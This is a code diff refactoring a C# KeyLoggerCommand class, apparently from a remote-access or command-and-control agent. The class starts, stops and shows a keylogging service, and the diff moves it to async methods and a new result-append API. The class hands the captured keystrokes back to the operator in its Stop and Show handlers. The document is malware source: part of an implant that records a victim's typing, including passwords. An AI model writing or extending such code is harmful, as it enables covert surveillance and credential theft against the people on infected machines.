@@ -12,47 +12,48 @@ using Agent.Models;
 using System.Diagnostics;
 using Agent.Service;
 using Agent.Commands.Services;
+using Shared;
 
 namespace Agent.Commands
 {
-    public class KeyLoggerCommand : ServiceCommand<IKeyLogService>
+    public class KeyLoggerCommand : RunningServiceCommand<IKeyLogService>
     {
-        public override string Name => "keylog";
+        public override CommandId Command => CommandId.KeyLog;
 
-        protected override void Start(AgentTask task, AgentCommandContext context, string[] args)
+        protected override async Task Start(AgentTask task, AgentCommandContext context)
         {
             if (this.Service.Status == RunningService.RunningStatus.Running)
             {
-                context.Result.Result = "Key Logger is already running!";
+                context.AppendResult("Key Logger is already running!");
                 return;
             }
 
             this.Service.Start();
-            context.Result.Result = $"Key Logger started";
+            context.AppendResult($"Key Logger started");
         }
 
-        protected override void Stop(AgentTask task, AgentCommandContext context, string[] args)
+        protected override async Task Stop(AgentTask task, AgentCommandContext context)
         {
             if (this.Service.Status != RunningService.RunningStatus.Running)
             {
-                context.Result.Result = "Key Logger is not running!";
+                context.AppendResult("Key Logger is not running!");
                 return;
             }
 
             this.Service.Stop();
-            context.Result.Result = $"Key Logger stoped : " + Environment.NewLine;
-            context.Result.Result += this.Service.LoggedKeyStrokes;
+            context.AppendResult("Key Logger stopped : " + Environment.NewLine);
+            context.AppendResult(this.Service.LoggedKeyStrokes);
         }
 
-        protected override void Show(AgentTask task, AgentCommandContext context, string[] args)
+        protected override async Task Show(AgentTask task, AgentCommandContext context)
         {
             if (this.Service.Status == RunningService.RunningStatus.Running)
             {
-                context.Result.Result = "Key Logger is running!";
-                context.Result.Result += this.Service.LoggedKeyStrokes;
+                context.AppendResult("Key Logger is running!");
+                context.AppendResult(this.Service.LoggedKeyStrokes);
             }
             else
-                context.Result.Result = "Key Logger is stopped!";
+                context.AppendResult("Key Logger is stopped!");
             return;
         }
     }
